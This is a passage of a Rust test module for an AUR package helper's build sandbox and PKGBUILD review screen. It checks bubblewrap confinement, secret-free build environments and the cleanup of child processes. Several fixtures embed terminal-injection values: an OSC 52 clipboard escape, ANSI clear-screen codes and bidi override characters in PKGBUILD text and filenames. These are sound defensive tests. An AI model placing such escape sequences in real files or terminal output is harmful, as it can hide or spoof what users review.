            "/proc",
            "/proc",
            "--dev",
            "/dev",
            "--",
            "/bin/bash",
            "-c",
        ]);
        command.arg(
            r#"/bin/bash -c '
                exec 3<>/dev/tcp/127.0.0.1/"$1" || exit 1
                read -r host_pid rest < /proc/self/stat
                printf "%s\n" "$host_pid" >&3
                read -r -t 30 finish <&3
            ' child "$1" & wait"#,
        );
        command.arg("build").arg(port).stdin(Stdio::null());
        let mut runner = spawn_logged_sandbox_fixture(client, command, "fixture");
        let _abort_runner = scopeguard::guard(runner.abort_handle(), |handle| handle.abort());
        let stream = logged_sandbox_fixture_readiness(&listener, &mut runner, &log_path).await;
        let mut readiness = tokio::io::BufReader::new(stream);
        let mut pid = String::new();
        tokio::time::timeout(Duration::from_secs(5), readiness.read_line(&mut pid))
            .await
            .unwrap()
            .unwrap();
        let pid =
            Pid::from_raw(pid.trim().parse().expect("child host PID")).expect("nonzero child PID");
        // SAFETY: AsyncFd owns the pidfd, which is never replaced or closed independently.
        #[expect(
            unsafe_code,
            reason = "Tokio requires an explicit ownership proof for AsyncFd registration"
        )]
        let exit =
            unsafe { AsyncFd::register(pidfd_open(pid, PidfdFlags::NONBLOCK).unwrap()).unwrap() };
        let _cleanup_child = scopeguard::guard(&exit, |exit| {
            // The failed regression must not leak its fixture. A pidfd
            // cannot accidentally signal an unrelated process after PID reuse.
            let _ = pidfd_send_signal(exit.get_ref(), Signal::KILL);
        });

        runner.abort();
        assert!(
            runner
                .await
                .expect_err("runner must be cancelled")
                .is_cancelled()
        );
        let _exited = tokio::time::timeout(Duration::from_secs(2), exit.readable())
            .await
            .expect("cancelling a sandbox build must terminate its compiler descendants")
            .expect("observe child exit");
    }

    #[test]
    fn sandbox_mounts_external_resolver_target() {
        let resolver = std::fs::canonicalize("/etc/resolv.conf").unwrap();
        if resolver.starts_with("/etc") {
            return;
        }

        let mut command = Command::new("bwrap");
        configure_sandbox_resolver(&mut command).unwrap();
        let args: Vec<_> = command.as_std().get_args().collect();

        assert!(args.contains(&resolver.as_os_str()));
        assert!(
            resolver
                .parent()
                .is_some_and(|parent| args.contains(&parent.as_os_str()))
        );
    }

    /// A host without a usable resolver (container, chroot, dangling
    /// /etc/resolv.conf symlink) must not fail every AUR build at sandbox
    /// setup; there is simply nothing to mount.
    #[test]
    fn sandbox_resolver_setup_skips_when_the_host_has_no_resolver() {
        let temp = tempfile::tempdir().unwrap();

        let missing = temp.path().join("resolv.conf");
        let mut command = Command::new("bwrap");
        configure_sandbox_resolver_at(&mut command, &missing).unwrap();
        assert_eq!(command.as_std().get_args().count(), 0);

        // Same for a dangling symlink (e.g. points into an unmounted /run).
        let dangling = temp.path().join("dangling");
        std::os::unix::fs::symlink(temp.path().join("unmounted/run/resolv.conf"), &dangling)
            .unwrap();
        let mut command = Command::new("bwrap");
        configure_sandbox_resolver_at(&mut command, &dangling).unwrap();
        assert_eq!(command.as_std().get_args().count(), 0);
    }

    /// Verify that bubblewrap's read-only root bind blocks writes outside
    /// the writable mounts our sandbox configures.
    ///
    /// This tests bwrap itself with representative args, NOT the production
    /// argument list built by `run_sandboxed_makepkg` (which cannot be run
    /// hermetically in a unit test). The production args are covered by the
    /// path-validation unit tests (`validate_path_inside`, `is_symlink`).
    #[tokio::test]
    async fn bwrap_readonly_root_blocks_arbitrary_writes() {
        // We can't call run_sandboxed_makepkg directly without a full build
        // environment, so exercise bwrap's ro-bind guarantee directly.

        let bwrap_path = which::which("bwrap");
        if bwrap_path.is_err() {
            println!("Skipping sandbox test: bubblewrap not installed");
            return;
        }

        // Create a dummy file to try to overwrite
        let temp_dir = tempfile::TempDir::new().unwrap();
        let sensitive_file = temp_dir.path().join("sensitive.txt");
        std::fs::write(&sensitive_file, "secret").unwrap();

        // Keep the fixture visible: a fresh /tmp would hide its parent and
        // make ENOENT look like a successful read-only-mount regression.
        // The writable control must execute the same shell and write first.
        for readonly in [false, true] {
            std::fs::write(&sensitive_file, "secret").unwrap();
            let output = Command::new("bwrap")
                .args([
                    if readonly { "--ro-bind" } else { "--bind" },
                    "/",
                    "/",
                    "--dev",
                    "/dev",
                    "--proc",
                    "/proc",
                    "--setenv",
                    "LC_ALL",
                    "C",
                    "--",
                    "/bin/sh",
                    "-eu",
                    "-c",
                    "cat -- \"$1\"; printf hacked > \"$1\"",
                    "readonly-fixture",
                ])
                .arg(&sensitive_file)
                .output()
                .await
                .unwrap();
            assert_eq!(output.stdout, b"secret", "fixture must be readable");
            let stderr = String::from_utf8_lossy(&output.stderr);
            if readonly {
                assert!(!output.status.success(), "read-only write succeeded");
                assert!(stderr.contains("Read-only file system"), "{stderr}");
                assert_eq!(std::fs::read(&sensitive_file).unwrap(), b"secret");
            } else {
                assert!(output.status.success(), "writable control failed: {stderr}");
                assert_eq!(std::fs::read(&sensitive_file).unwrap(), b"hacked");
            }
        }
    }

    #[tokio::test]
    async fn sandbox_fakeroot_skips_unmappable_real_chown() {
        use std::os::unix::fs::{MetadataExt, PermissionsExt};

        if which::which("bwrap").is_err() || which::which("fakeroot").is_err() {
            return;
        }

        let temp = tempfile::Builder::new()
            .permissions(std::fs::Permissions::from_mode(0o700))
            .tempdir()
            .unwrap();
        let source = temp.path().join("source");
        let destination = temp.path().join("destination");
        std::fs::create_dir_all(source.join("nested")).unwrap();
        std::fs::create_dir_all(&destination).unwrap();
        std::fs::write(source.join("nested/file"), "payload").unwrap();

        let host_uid = nix::unistd::geteuid().as_raw();
        let host_gid = nix::unistd::getegid().as_raw();
        // CI already permits container-root namespace setup. Mapping that
        // creator to a nonzero sandbox UID keeps namespace root unmapped,
        // without requiring the host to permit unprivileged userns setup.
        // Drop all payload capabilities and prove real chown still fails.
        // This models the confined payload, not the host policy governing
        // whether an unprivileged caller may launch bubblewrap itself.
        let (uid, gid) = if host_uid == 0 {
            let account = nix::unistd::User::from_name("nobody")
                .unwrap()
                .expect("root fakeroot regression requires a nobody account");
            (account.uid.as_raw(), account.gid.as_raw())
        } else {
            (host_uid, host_gid)
        };
        assert_ne!(uid, 0, "fakeroot payload must have a nonzero namespace UID");
        let mut command = Command::new("bwrap");
        command
            .arg("--unshare-user")
            .arg("--uid")
            .arg(uid.to_string())
            .arg("--gid")
            .arg(gid.to_string())
            .args(["--cap-drop", "ALL"]);
        command.args([
            "--clearenv",
            "--ro-bind",
            "/",
            "/",
            "--tmpfs",
            "/tmp",
            "--bind",
        ]);
        command.arg(temp.path()).arg(temp.path());
        command.args(["--chdir"]);
        command.arg(temp.path());
        command.args([
            "--setenv",
            "PATH",
            "/usr/local/sbin:/usr/local/bin:/usr/bin",
            "--setenv",
            SANDBOX_FAKEROOT_ENV.0,
            SANDBOX_FAKEROOT_ENV.1,
            "--",
            "sh",
            "-eu",
            "-c",
            concat!(
                "test \"$(id -u)\" != 0; ",
                "test \"$(id -g)\" != 0; ",
                "grep -Eq \"^CapEff:[[:space:]]+0+$\" /proc/self/status; ",
                "grep -Eq \"^CapPrm:[[:space:]]+0+$\" /proc/self/status; ",
                "cat /proc/self/uid_map; ",
                "awk -v uid=\"$(id -u)\" ",
                "'NR == 1 { if ($1 != uid || $3 != 1) exit 1 } ",
                "END { if (NR != 1) exit 1 }' /proc/self/uid_map; ",
                "test \"$(cat source/nested/file)\" = payload; ",
                "printf control > destination/control; ",
                "owner=$(stat -c '%u:%g' source/nested/file); ",
                "if chown 0:0 source/nested/file; then ",
                "echo 'real chown unexpectedly succeeded' >&2; exit 1; fi; ",
                "test \"$(stat -c '%u:%g' source/nested/file)\" = \"$owner\"; ",
                "fakeroot sh -eu -c '",
                "chown -R 0:0 source; ",
                "test \"$(stat -c '%u:%g' source/nested/file)\" = 0:0; ",
                "cp -a source/. destination/copied; ",
                "test \"$(stat -c '%u:%g' destination/copied/nested/file)\" = 0:0'",
            ),
        ]);

        let status = command.status().await.unwrap();
        assert!(status.success());
        assert_eq!(
            std::fs::read(source.join("nested/file")).unwrap(),
            b"payload"
        );
        assert_eq!(
            std::fs::read(destination.join("control")).unwrap(),
            b"control"
        );
        for path in [
            source.join("nested/file"),
            destination.join("copied/nested/file"),
        ] {
            let metadata = std::fs::metadata(path).unwrap();
            assert_eq!((metadata.uid(), metadata.gid()), (host_uid, host_gid));
        }
        assert_eq!(
            std::fs::read_to_string(destination.join("copied/nested/file")).unwrap(),
            "payload"
        );
    }

    #[test]
    fn pkgbuild_review_is_bounded_and_terminal_safe() {
        let rendered = pkgbuild_review_text(b"pkgname=safe\n\x1b]52;c;secret\x07\n")
            .expect("small PKGBUILD must render");
        assert_eq!(rendered, "pkgname=safe\n]52;c;secret\n");

        let bidi = pkgbuild_review_text(b"pkgname=safe\n\xe2\x80\xaao\xe2\x81\xa7i\n")
            .expect("PKGBUILD with bidi characters must render");
        assert_eq!(bidi, "pkgname=safe\noi\n");

        let oversized = vec![b'x'; MAX_PKGBUILD_REVIEW_BYTES + 1];
        let error = pkgbuild_review_text(&oversized)
            .expect_err("oversized PKGBUILD must fail before terminal rendering");
        assert!(error.to_string().contains("review limit"));
    }

    #[test]
    fn pkgbuild_review_panel_is_inline_and_package_specific() {
        let review = "pkgname=google-chrome\npkgver=140.0\n";
        let digest = pkgbuild_digest(review.as_bytes());
        let panel = pkgbuild_review_panel(
            "google-chrome",
            &digest,
            review,
            std::path::Path::new("/tmp/PKGBUILD"),
            &[],
            &[],
            false,
        );

        assert!(panel.contains("AUR"));
        assert!(panel.contains("google-chrome"));
        assert!(!panel.contains("Review google-chrome"));
        assert!(panel.to_lowercase().contains("sha-256"));
        assert!(panel.contains(&digest));
        assert!(panel.contains("pkgname=google-chrome"));
        assert!(!panel.contains(&"─".repeat(72)));
        assert_eq!(
            pkgbuild_review_prompt("google-chrome"),
            "Build google-chrome from this PKGBUILD?"
        );
    }

    #[test]
    fn source_filename_review_escapes_controls_without_hiding_identity() {
        let raw = "patch\n\r\u{1b}[2J\u{202e}\u{200b}\u{2028}\\n.diff";
        let file = AurReviewFiles {
            relative: Path::new(raw),
            bytes: 12,
            digest: "a".repeat(64),
        };
        for verbose in [false, true] {
            let panel = pkgbuild_review_panel(
                "demo",
                &"b".repeat(64),
                "pkgname=demo",
                Path::new("/tmp/PKGBUILD"),
                std::slice::from_ref(&file),
                &[],
                verbose,
            );
            assert!(!panel.contains(raw));
            assert!(!panel.contains('\r'));
            for control in ['\u{202e}', '\u{200b}', '\u{2028}'] {
                assert!(!panel.contains(control));
            }
            assert!(panel.contains("patch\\n\\r\\u{1b}[2J\\u{202e}\\u{200b}\\u{2028}\\\\n.diff"));
        }
    }

    #[test]
    fn source_filename_review_errors_escape_hook_and_symlink_names() -> Result<()> {
        let hook = "hook\u{1b}[2J\u{202e}.install";
        let source = ReviewedSource {
            files: std::collections::BTreeMap::from([(
                PathBuf::from(".SRCINFO"),
                format!("install = {hook}\n").into_bytes(),
            )]),
            digest: "a".repeat(64),
            parsed_srcinfo: OnceLock::new(),
        };
        let error = declared_install_hook_previews(&source)
            .unwrap_err()
            .to_string();
        assert!(!error.contains('\u{1b}'));
        assert!(!error.contains('\u{202e}'));
        assert!(error.contains("hook\\u{1b}[2J\\u{202e}.install"));
        let root = tempfile::tempdir()?;
        let error = contained_aur_symlink_target(
            root.path(),
            &root.path().join("file\n\u{1b}[2J"),
            Path::new("/outside\r\u{202e}"),
        )
        .unwrap_err()
        .to_string();
        assert!(!error.contains(['\n', '\r', '\u{1b}', '\u{202e}']));
        assert!(error.contains("file\\n\\u{1b}[2J"));
        Ok(())
    }

    #[test]
    fn pkgbuild_review_summary_is_one_line_without_source_text() {
        let digest = pkgbuild_digest(b"pkgname=demo\nsource=('https://example.test')\n");
        let summary = pkgbuild_review_summary("demo", &digest, 2);
        assert!(summary.contains("AUR"));
        assert!(summary.contains("demo"));
        assert!(summary.contains("2 files"));
        assert!(summary.contains(&digest[..12]));
        assert!(!summary.contains("source="));
        assert!(!summary.contains('\n'));
    }

    #[test]
    fn pkgbuild_review_panel_truncates_long_pkgbuilds() {
        let review = (0..100)
            .map(|i| format!("line{i}=value"))
            .collect::<Vec<_>>()
            .join("\n");
        let digest = pkgbuild_digest(review.as_bytes());
        let path = std::path::Path::new("/cache/aur/chatgpt-desktop/PKGBUILD");
        let panel =
            pkgbuild_review_panel("chatgpt-desktop", &digest, &review, path, &[], &[], false);

        assert!(panel.contains("line0=value"));
        assert!(panel.contains("line7=value"));
        assert!(!panel.contains("line8=value"));
        assert!(panel.contains("8 of 100 lines"));
        assert!(panel.contains("/cache/aur/chatgpt-desktop/PKGBUILD"));
        assert!(panel.contains(&digest));
        assert!(panel.contains("omg -v dumps the full PKGBUILD"));
    }

    #[test]
    fn pkgbuild_review_panel_verbose_prints_the_full_file() {
        let review = (0..20)
            .map(|i| format!("line{i}=value"))
            .collect::<Vec<_>>()
            .join("\n");
        let digest = pkgbuild_digest(review.as_bytes());
        let srcinfo = AurReviewFiles {
            relative: Path::new(".SRCINFO"),
            bytes: 12,
            digest: pkgbuild_digest(b"srcinfo"),
        };
        let panel = pkgbuild_review_panel(
            "demo",
            &digest,
            &review,
            Path::new("/tmp/PKGBUILD"),
            &[srcinfo],
            &[],
            true,
        );

        assert!(panel.contains("line19=value"));
        assert!(panel.contains(".SRCINFO"));
        assert!(!panel.contains("omg -v dumps the full PKGBUILD"));
    }

    #[test]
    fn pkgbuild_review_panel_does_not_dump_srcinfo_by_default() {
        let review = "pkgname=demo\nsource=(\"https://example.test/a.tar.gz\")\n";
        let digest = pkgbuild_digest(review.as_bytes());
        let srcinfo_body = "pkgbase = demo\npkgname = demo\n";
        let srcinfo = AurReviewFiles {
            relative: Path::new(".SRCINFO"),
            bytes: srcinfo_body.len(),
            digest: pkgbuild_digest(srcinfo_body.as_bytes()),
        };
        let panel = pkgbuild_review_panel(
            "demo",
            &digest,
            review,
            Path::new("/tmp/PKGBUILD"),
            &[srcinfo],
            &[],
            false,
        );

        assert!(panel.contains(".SRCINFO"));
        assert!(!panel.contains("pkgbase = demo"));
        assert!(panel.contains("source="));
    }

    #[test]
    #[serial_test::serial]
    fn pkgbuild_review_card_plain_layout() {
        temp_env::with_var("NO_COLOR", Some("1"), || {
            let review = concat!(
                "# Maintainer: Alice\n",
                "pkgname=ai-usagebar-bin\n",
                "pkgver=0.1.7\n",
                "pkgrel=1\n",
                "url=\"https://example.test/x\"\n",
                "depends=('gtk3')\n",
                "source=(\"https://example.test/x.tar.gz\")\n",
                "sha256sums=('deadbeef')\n",
            );
            let digest = pkgbuild_digest(review.as_bytes());
            let panel = pkgbuild_review_panel(
                "ai-usagebar-bin",
                &digest,
                review,
                Path::new("/tmp/cache/ai-usagebar-bin/PKGBUILD"),
                &[],
                &[],
                false,
            );
            assert!(panel.contains("  |  AUR  ai-usagebar-bin"));
            assert!(panel.contains("package"));
            assert!(panel.contains("ai-usagebar-bin"));
            assert!(panel.contains("Alice"));
            assert!(panel.contains("source="));
            assert!(panel.contains("sha256sums="));
            assert!(panel.contains(&digest));
            assert!(!panel.contains(&"─".repeat(72)));
        });
    }

    #[test]
    fn pkgbuild_review_panel_shows_declared_install_hooks() {
        let review = "pkgname=demo\npkgver=1.0\n";
        let digest = pkgbuild_digest(review.as_bytes());
        let hook = "post_install() {\n  systemctl daemon-reload\n}\n";
        let hooks = vec![("demo.install".to_owned(), hook.to_owned())];
        let panel = pkgbuild_review_panel(
            "demo",
            &digest,
            review,
            Path::new("/tmp/PKGBUILD"),
            &[],
            &hooks,
            false,
        );
        assert!(panel.contains("demo.install"));
        assert!(panel.contains("systemctl daemon-reload"));

        let plain = pkgbuild_review_panel(
            "demo",
            &digest,
            review,
            Path::new("/tmp/PKGBUILD"),
            &[],
            &[],
            false,
        );
        assert!(!plain.contains("hook"));
    }

    #[test]
    fn declared_install_hook_previews_render_every_declared_script() {
        let mut files = std::collections::BTreeMap::new();
        files.insert(
            Path::new(".SRCINFO").to_owned(),
            b"pkgbase = demo\npkgname = demo\ninstall = demo.install\n".to_vec(),
        );
        files.insert(
            Path::new("demo.install").to_owned(),
            b"post_install() {\n  echo ok\n}\n\x1b]52;c;secret\x07\n".to_vec(),
        );
        let source = ReviewedSource {
            files,
            digest: String::new(),
            parsed_srcinfo: OnceLock::new(),
        };
        let hooks = declared_install_hook_previews(&source).unwrap();
        assert_eq!(hooks.len(), 1);
        assert_eq!(hooks[0].0, "demo.install");
        assert!(hooks[0].1.contains("echo ok"));
        assert!(!hooks[0].1.contains('\u{1b}'));
    }

    #[tokio::test]
    async fn parallel_pkgbuild_reviews_share_a_single_gate() {
        let first_review = REVIEW_LOCK.lock().await;
        let mut queued_review = tokio::spawn(async { REVIEW_LOCK.lock().await });
        tokio::task::yield_now().await;

        assert!(
            tokio::time::timeout(Duration::from_millis(50), &mut queued_review)
                .await
                .is_err(),
            "a second PKGBUILD review entered while the first still owned the terminal"
        );

        drop(first_review);
        let _queued_guard = tokio::time::timeout(Duration::from_secs(1), queued_review)
            .await
            .expect("queued review should enter after the first completes")
            .expect("queued review task should complete");
    }

    #[tokio::test]
    async fn build_environment_drops_inherited_secrets() {
        let home = tempfile::tempdir().expect("temporary build home");
        let mut command = Command::new("/usr/bin/env");
        command.env("OMG_TEST_SECRET", "must-not-leak");
        configure_build_environment(&mut command, home.path(), "builder");

        let output = command.output().await.expect("run env probe");
        assert!(output.status.success());
        let environment = String::from_utf8(output.stdout).expect("environment must be UTF-8");
        assert!(environment.contains(&format!("HOME={}", home.path().display())));
        assert!(environment.contains("USER=builder"));
        assert!(environment.contains("PATH=/usr/local/sbin:/usr/local/bin:/usr/bin"));
        assert!(
            !environment.contains("OMG_TEST_SECRET"),
            "untrusted builds must not inherit caller credentials: {environment}"
        );
    }

    #[tokio::test]
    async fn quiet_build_output_is_fully_written_to_the_log() {
        let temp = tempfile::tempdir().expect("temporary log directory");
        let log_path = temp.path().join("build.log");
        let log = tokio::fs::File::create(&log_path)
            .await
            .expect("create build log");
        let log = Arc::new(tokio::sync::Mutex::new(BuildLog {
            file: log,
            bytes: 0,
            limit: MAX_AUR_BUILD_LOG_BYTES,
        }));
        let (mut writer, reader) = tokio::io::duplex(128);

        writer
            .write_all(b"compiler output\n")
            .await
            .expect("write fake compiler output");
        writer.shutdown().await.expect("close fake compiler output");

        Box::pin(drain_build_output(
            reader,
            Arc::clone(&log),
            BuildOutputStream::Stdout,
            false,
        ))
        .await
        .expect("drain output");
        log.lock()
            .await
            .file
            .flush()
            .await
            .expect("flush build log");

        assert_eq!(
            tokio::fs::read_to_string(log_path)
                .await
                .expect("read build log"),
            "compiler output\n"
        );
    }

    #[tokio::test]
    async fn build_runner_stops_unbounded_output_and_duration() {
        let directory = tempfile::tempdir().expect("isolated build logs");
        let client = AurClient {
            build_dir: directory.path().to_path_buf(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let mut noisy = Command::new("sh");
        noisy.args(["-c", "head -c 4096 /dev/zero"]);
        let error = tokio::time::timeout(
            Duration::from_secs(2),
            client.run_logged_build_command_with_limits(
                &mut noisy,
                "noisy",
                64,
                Duration::from_secs(1),
                BuildIsolation::ProcessGroup,
            ),
        )
        .await
        .expect("noisy build must stop promptly")
        .expect_err("oversized output must fail");
        assert!(format!("{error:#}").contains("log exceeded its byte limit"));
        assert!(
            std::fs::metadata(client.build_log_path("noisy"))
                .expect("bounded log")
                .len()
                <= 64
        );

        let mut stalled = Command::new("sh");
        stalled.args(["-c", "sleep 10"]);
        let error = tokio::time::timeout(
            Duration::from_secs(2),
            client.run_logged_build_command_with_limits(
                &mut stalled,
                "stalled",
                64,
                Duration::from_millis(50),
                BuildIsolation::ProcessGroup,
            ),
        )
        .await
        .expect("stalled build must stop promptly")
        .expect_err("stalled build must fail");
        assert!(format!("{error:#}").contains("duration limit"));
    }

    // These probes use the production native launcher and logged runner. Only
    // makepkg is replaced, with a disposable shell that starts a real child.
    async fn native_build_cleanup_probe(mode: &'static str) -> Result<()> {
        use std::os::unix::fs::PermissionsExt;

        // Subreaper state is process-wide. Run one probe in a fresh test process
        // so adoption cannot steal children from concurrently running tests.
        const PROBE_MODE: &str = "OMG_NATIVE_BUILD_PROBE_MODE";
        if std::env::var(PROBE_MODE).as_deref() != Ok(mode) {
            let test_name = match mode {
                "timeout" => "native_build_timeout_terminates_descendants",
                "capture" => "native_build_capture_failure_terminates_descendants",
                "cancel" => "native_build_cancellation_terminates_descendants",
                "cancel-delayed" => {
                    "native_build_delayed_startup_cancellation_terminates_descendants"
                }
                "startup-failure" => "native_build_startup_failure_reports_exit_status",
                "status" => "native_build_preserves_exit_status",
                _ => anyhow::bail!("unknown native probe mode: {mode}"),
            };
            let status = Command::new(std::env::current_exe()?)
                .args([
                    "--exact",
                    &format!("package_managers::aur::client::tests::{test_name}"),
                    "--nocapture",
                ])
                .env(PROBE_MODE, mode)
                .kill_on_drop(true)
                .status()
                .await?;
            anyhow::ensure!(
                status.success(),
                "isolated native {mode} probe failed: {status}"
            );
            return Ok(());
        }
        // The exact probe child must observe the context being tested. A
        // namespace wrapper's identity alone does not establish this child's
        // inherited process group after the isolation subprocess is launched.
        const EXPECT_PARENT_GROUP: &str = "OMG_NATIVE_BUILD_EXPECT_PARENT_PGRP";
        let probe_pid = std::process::id();
        let probe_uid = nix::unistd::getuid().as_raw();
        let probe_group = nix::unistd::getpgrp().as_raw();
        println!(
            "[native-build-probe-context] mode={mode} pid={probe_pid} uid={probe_uid} pgrp={probe_group}"
        );
        if let Some(expected) = std::env::var_os(EXPECT_PARENT_GROUP) {
            match expected.to_str() {
                Some("zero") => anyhow::ensure!(
                    probe_group == 0,
                    "native {mode} probe expected inherited group zero; actual PID {probe_pid}, PGID {probe_group}"
                ),
                Some("nonzero") => anyhow::ensure!(
                    probe_group > 0,
                    "native {mode} probe expected a visible inherited group; actual PID {probe_pid}, PGID {probe_group}"
                ),
                _ => anyhow::bail!(
                    "{EXPECT_PARENT_GROUP} must be 'zero' or 'nonzero' when configured"
                ),
            }
        }
        nix::sys::prctl::set_child_subreaper(true)?;
        let directory = tempfile::tempdir()?;
        let fixture = directory.path().join("makepkg");
        std::fs::write(
            &fixture,
            "#!/bin/sh\ncase \"$1\" in status|startup-failure) exit 23;; cancel-delayed) sleep 3;; esac\nsleep 30 &\nchild=$!\ncat /proc/$$/stat > session\ncat /proc/$$/status > status\ncat /proc/$child/stat > descendant\nprintf '%s %s\\n' $$ $child > identities.tmp\nmv identities.tmp identities\nif [ \"$1\" = capture ]; then head -c 4096 /dev/zero; fi\nwait\n",
        )?;
        std::fs::set_permissions(&fixture, std::fs::Permissions::from_mode(0o700))?;
        let path = directory.path().to_path_buf();
        let task_path = path.clone();
        let mut worker = tokio::spawn(async move {
            let client = AurClient {
                build_dir: task_path.clone(),
                settings: Settings::default(),
                package_base_locks: Arc::new(dashmap::DashMap::new()),
            };
            let mut command = native_build_command()?;
            command
                .env("PATH", format!("{}:/usr/bin", task_path.display()))
                .current_dir(&task_path)
                .arg(mode);
            client
                .run_logged_build_command_with_limits(
                    &mut command,
                    "native-probe",
                    64,
                    if mode == "timeout" {
                        Duration::from_millis(300)
                    } else if mode.starts_with("cancel") {
                        Duration::from_secs(30)
                    } else {
                        Duration::from_secs(3)
                    },
                    BuildIsolation::NativeSession,
                )
                .await
        });
        if mode == "status" {
            assert_eq!(worker.await??.code(), Some(23));
            return Ok(());
        }
        // Cancellation starts after the fixture publishes its complete identity,
        // not after an assumed two-second launcher startup. Its build deadline
        // stays separate from the unchanged two-second kill/reap deadline below.
        let startup_budget = if mode.starts_with("cancel") {
            Duration::from_secs(10)
        } else {
            Duration::from_secs(2)
        };
        let ready = tokio::time::timeout(startup_budget, async {
            while !path.join("identities").exists() {
                if mode.starts_with("cancel") || mode == "startup-failure" {
                    tokio::select! {
                        result = &mut worker => {
                            let status = result.context("native probe worker failed before readiness")?
                                .context("native build failed before fixture readiness")?;
                            anyhow::bail!("native build exited before fixture readiness: {status}");
                        }
                        () = tokio::time::sleep(Duration::from_millis(10)) => {}
                    }
                } else {
                    // Capture/timeout intentionally finish before this loop
                    // observes readiness. Preserve their result for the oracle.
                    tokio::time::sleep(Duration::from_millis(10)).await;
                }
            }
            Ok::<_, anyhow::Error>(())
        })
        .await
        .context("native build fixture did not become ready")
        .and_then(std::convert::identity);
        if ready.is_err() && !worker.is_finished() {
            worker.abort();
            assert!(
                (&mut worker)
                    .await
                    .expect_err("startup worker aborted")
                    .is_cancelled()
            );
        }
        if mode == "startup-failure" {
            let error = ready.expect_err("early fixture exit must fail readiness");
            assert!(format!("{error:#}").contains("exit status: 23"));
            return Ok(());
        }
        ready?;
        let identities = std::fs::read_to_string(path.join("identities"))?;
        let pids = identities
            .split_whitespace()
            .map(str::parse::<u32>)
            .collect::<std::result::Result<Vec<_>, _>>()?;
        assert_eq!(pids.len(), 2);
        let leader_stat = std::fs::read_to_string(path.join("session"))?;
        let descendant_stat = std::fs::read_to_string(path.join("descendant"))?;
        let descendant_fields: Vec<_> = descendant_stat.split_whitespace().collect();
        assert_ne!(
            descendant_fields[2], "Z",
            "fixture descendant started alive"
        );
        assert_eq!(descendant_fields[3], pids[0].to_string());
        assert_eq!(descendant_fields[4], pids[0].to_string());
        if mode.starts_with("cancel") {
            worker.abort();
            assert!(worker.await.expect_err("worker aborted").is_cancelled());
        } else {
            let error = worker.await?.expect_err("bounded native build must fail");
            assert!(format!("{error:#}").contains(if mode == "timeout" {
                "duration limit"
            } else {
                "log exceeded its byte limit"
            }));
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
        let running: Vec<_> = pids
            .iter()
            .copied()
            .filter(|pid| {
                std::fs::read_to_string(format!("/proc/{pid}/stat"))
                    .is_ok_and(|stat| stat.split_whitespace().nth(2) != Some("Z"))
            })
            .collect();
        // Clean up the known disposable session even when the regression fails.
        terminate_build_group(pids[0])?;
        // The runner owns makepkg. Its shell can reap sleep before dying;
        // otherwise this isolated subreaper adopts and reaps that exact PID.
        // ECHILD alone is insufficient: the PID must also be absent from proc.
        let descendant = nix::unistd::Pid::from_raw(i32::try_from(pids[1])?);
        checked_reap_native_probe_child(descendant, Duration::from_secs(2)).await?;
        assert!(
            running.is_empty(),
            "native {mode} left running PIDs {running:?}; initial identity {leader_stat:?}"
        );
        tokio::time::timeout(Duration::from_secs(2), async {
            while pids
                .iter()
                .any(|pid| Path::new(&format!("/proc/{pid}")).exists())
            {
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        })
        .await
        .context("native build processes must be reaped, including adopted descendants")?;
        let fields: Vec<_> = leader_stat.split_whitespace().collect();
        assert_eq!(
            fields[3],
            std::process::id().to_string(),
            "no forked launcher intermediary"
        );
        assert_eq!(
            fields[4],
            pids[0].to_string(),
            "build owns its process group"
        );
        assert_eq!(fields[5], pids[0].to_string(), "build owns its session");
        assert_eq!(fields[6], "0", "build has no controlling TTY");
        assert!(std::fs::read_to_string(path.join("status"))?.contains("NoNewPrivs:\t1"));
        Ok(())
    }

    async fn checked_reap_native_probe_child(
        pid: nix::unistd::Pid,
        budget: Duration,
    ) -> Result<Option<nix::sys::wait::WaitStatus>> {
        let reaped = reap_native_probe_child(pid, budget).await?;
        if let Some(status) = reaped {
            assert_eq!(
                status,
                nix::sys::wait::WaitStatus::Signaled(pid, nix::sys::signal::Signal::SIGKILL, false),
                "adopted descendant must have been terminated"
            );
        }
        Ok(reaped)
    }

    async fn reap_native_probe_child(
        pid: nix::unistd::Pid,
        budget: Duration,
    ) -> Result<Option<nix::sys::wait::WaitStatus>> {
        tokio::time::timeout(budget, async {
            loop {
                match nix::sys::wait::waitpid(pid, Some(nix::sys::wait::WaitPidFlag::WNOHANG)) {
                    Err(nix::errno::Errno::ECHILD) => {
                        match std::fs::symlink_metadata(format!("/proc/{pid}")) {
                            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                                return Ok(None);
                            }
                            Err(error) => return Err(anyhow::Error::from(error)),
                            Ok(_) => tokio::time::sleep(Duration::from_millis(10)).await,
                        }
                    }
                    Ok(nix::sys::wait::WaitStatus::StillAlive) => {
                        tokio::time::sleep(Duration::from_millis(10)).await;
                    }
                    result => return result.map(Some).map_err(anyhow::Error::from),
                }
            }
        })
        .await
        .context("native fixture descendant remains present or unreaped")?
    }

    #[tokio::test]
    async fn native_probe_reaps_a_killed_owned_child() -> Result<()> {
        // A std child has no Tokio reaper competing for its wait status.
        let child = std::process::Command::new("/usr/bin/sleep")
            .arg("30")
            .spawn()?;
        let mut child = scopeguard::guard(child, |mut child| {
            let _ = child.kill();
            let _ = child.wait();
        });
        let pid = nix::unistd::Pid::from_raw(i32::try_from(child.id())?);
        child.kill()?;
        let status = checked_reap_native_probe_child(pid, Duration::from_secs(2)).await?;
        assert_eq!(
            status,
            Some(nix::sys::wait::WaitStatus::Signaled(
                pid,
                nix::sys::signal::Signal::SIGKILL,
                false
            ))
        );
        assert!(!Path::new(&format!("/proc/{pid}")).exists());
        Ok(())
    }

    #[tokio::test]
    async fn native_probe_accepts_an_already_reaped_child() -> Result<()> {
        let mut child = Command::new("/usr/bin/sleep").arg("30").spawn()?;
        let pid = nix::unistd::Pid::from_raw(i32::try_from(child.id().context("child PID")?)?);
        child.kill().await?;
        assert!(
            checked_reap_native_probe_child(pid, Duration::from_millis(100))
                .await?
                .is_none()
        );
        Ok(())
    }

    #[tokio::test]
    async fn native_probe_rejects_a_live_owned_child() -> Result<()> {
        let child = std::process::Command::new("/usr/bin/sleep")
            .arg("30")
            .spawn()?;
        let mut child = scopeguard::guard(child, |mut child| {
            let _ = child.kill();
            let _ = child.wait();
        });
        let pid = nix::unistd::Pid::from_raw(i32::try_from(child.id())?);
        let error = reap_native_probe_child(pid, Duration::from_millis(100))
            .await
            .expect_err("a live owned child must not be certified as reaped");
